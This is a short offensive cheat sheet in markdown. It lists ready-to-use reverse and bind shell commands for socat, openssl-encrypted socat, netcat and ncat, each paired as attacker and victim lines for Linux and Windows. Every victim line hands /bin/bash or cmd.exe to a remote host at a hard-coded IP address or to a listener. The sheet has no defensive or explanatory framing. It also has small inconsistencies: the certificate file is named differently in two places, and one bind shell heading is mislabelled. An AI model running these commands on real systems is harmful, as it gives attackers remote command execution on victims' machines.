# Reverse shell
## Socat<br>
**Attacker:** `socat -d -d TCP4-LISTEN:4443 STDOUT`<br>
**Victim:** `socat TCP4:192.168.0.107:4443 EXEC:/bin/bash`<br>
**Victim windows:** `socat TCP4:192.168.0.107:4443 EXEC:'cmd.exe',pipes`<br>

## Encrypted reverse shell
Create certificate: 
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
**Attacker:** `socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT`<br>
**Victim:** `socat OPENSSL:192.168.0.107:4443,verify=0 EXEC:/bin/bash`<br>
**Victim Windows:** `socat OPENSSL:192.168.0.107:4443,verify=0 EXEC:'cmd.exe',pipes`<br>

# Bind shell
## Socat
**Victim:** `socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash`<br>
**Victim Windows:**  `socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes`<br>
**Attacker:** `socat - TCP4:VICTIMIP:4443`

## Encrypted reverse shell
From victim machine we have to cert .pem file we can generate certificate and transfer to victim.<br>
**Victim:** `socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:/bin/bash`<br>
**Victim Windows:** `socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork EXEC:'cmd.exe',pipes`<br>
**Attacker:**  `socat - OPENSSL:VICTIMIP:4443,verify=0`<br>


# Netcat
## Reverse shell<br>
**Attacker:** `nc -lvnp 4444` **Encrypted:** `ncat -l 8080 --ssl -v`<br>
**Victim:** `nc 192.168.0.107 4444 -e /bin/bash` **Encrypted:** `ncat 192.168.0.110 8080 --ssl -e /bin/bash -v`

## Bind shell
**Victim:** `nc -lvp 4444 -e /bin/bash`<br>
**Attacker:** `nc 192.168.0.106 4444`<br>

